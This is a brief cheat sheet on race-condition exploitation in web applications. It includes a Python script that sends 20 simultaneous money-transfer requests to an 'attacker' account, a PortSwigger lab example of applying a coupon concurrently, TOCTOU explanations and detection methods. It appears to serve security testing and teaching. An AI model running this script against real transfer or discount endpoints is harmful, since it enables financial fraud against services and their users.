# Race Condition - Exploitation Techniques

## Basic Race Condition

### Concurrent Request Attack
```python
import threading
import requests

url = "https://target.com/api/transfer"
data = {"amount": 100, "to": "attacker"}

def send_request():
    requests.post(url, data=data, cookies={"session": "xxx"})

# Send 20 requests simultaneously
threads = [threading.Thread(target=send_request) for _ in range(20)]
for t in threads: t.start()
for t in threads: t.join()
```

### PortSwigger Lab - Limit Overrun
```
# Apply coupon code multiple times concurrently
POST /cart/coupon
coupon=SIGNUP30

# Send 20 concurrent requests with threading
# Each applies 30% discount, total discount exceeds 100%
```

## Time-of-Check to Time-of-Use (TOCTOU)

### File Race Condition
```
# Check if file exists, then read it
# Between check and read, file could be deleted/modified
# Attack: delete/modify file between check and read
```

### Database Race Condition
```
# Check balance, then deduct
# Between check and deduct, balance could change
# Attack: send concurrent deduction requests
```

## Detection Techniques

### Timing Analysis
```
# Send same request multiple times
# Measure response time variance
# High variance = potential race condition
```

### Concurrent Request Testing
```
# Send N identical requests simultaneously
# Compare responses for inconsistencies
# Different responses = confirmed race condition
```
